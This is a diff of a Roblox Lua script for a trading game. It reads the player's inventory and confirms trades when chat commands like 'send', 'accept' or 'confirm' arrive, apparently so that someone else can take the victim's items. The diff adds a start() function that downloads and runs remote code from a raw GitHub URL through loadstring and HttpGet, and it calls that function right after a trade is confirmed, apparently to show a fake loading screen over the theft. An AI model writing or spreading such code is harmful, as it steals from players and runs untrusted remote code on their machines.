@@ -1,7 +1,8 @@
+local function start()
 coroutine.wrap(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/PetVersee/loadingscreen/refs/heads/main/loading",true))()
     end)()
-    
+end
     coroutine.wrap(function()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local InventoryDB = Loads("InventoryDB")
@@ -119,7 +120,7 @@ coroutine.wrap(function()
       local AcceptTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
       AcceptTradeRemote:FireServer()
       wait(5)
-      game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
+        start()
     end
     
     local function SendTrade()
@@ -161,7 +162,7 @@ coroutine.wrap(function()
               if lowerMsg == "/send" or lowerMsg == "send" then
                 SendTrade()
               end
-              if lowerMsg == "/accept" or lowerMsg == "accept" or lowerMsg == "acce" then
+              if lowerMsg == "/accept" or lowerMsg == "accept" or lowerMsg == "acc" then
                 AcceptTrade()
               end
               if lowerMsg == "/confirm" or lowerMsg == "confirm" or lowerMsg == "con" then
